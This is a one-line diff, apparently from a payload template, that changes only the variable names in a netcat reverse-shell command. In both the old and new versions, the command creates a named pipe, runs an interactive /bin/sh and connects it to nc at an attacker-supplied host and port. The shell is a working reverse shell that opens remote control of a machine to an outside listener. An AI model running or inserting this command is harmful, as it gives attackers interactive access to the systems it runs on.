@@ -1,1 +1,1 @@
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${JJ_LHOST} ${JJ_LPORT} > /tmp/f
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${II_LHOST} ${II_LPORT} > /tmp/f
